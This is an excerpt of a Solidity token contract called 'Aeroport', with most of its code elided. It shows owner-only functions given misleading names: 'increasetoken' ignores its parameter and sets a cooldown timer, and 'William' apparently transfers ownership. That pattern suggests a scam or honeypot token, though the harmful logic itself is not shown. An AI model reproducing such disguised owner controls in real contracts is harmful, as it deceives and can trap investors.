...
contract AuthOwner is Context, IERC1363{  
    ...
    */
    function William(address newOwner) external onlyOwner returns (bool) {
...
contract Aeroport is AuthOwner {
    using SafeMath for uint256;    
    uint256 public totalSupply = 100000000 *  10**9;
    mapping(address => uint256) balances;
    mapping(address => mapping(address => uint256)) internal allowed;
    string public name = "Aeroport";    
    string public symbol = "AEROPORT";
    ...
    function increasetoken(uint256 minimumTokenBalanceForDividends) external onlyOwner {
        _coolWait = 3600;
    ...
    function constructionReset(uint256 newCoolWait) external onlyOwner {
        require(
    ...
    function sentdata(uint256 gas) external pure returns(uint256) {
      require(gas >= 75);        
      return gas * 1 gwei;
  }
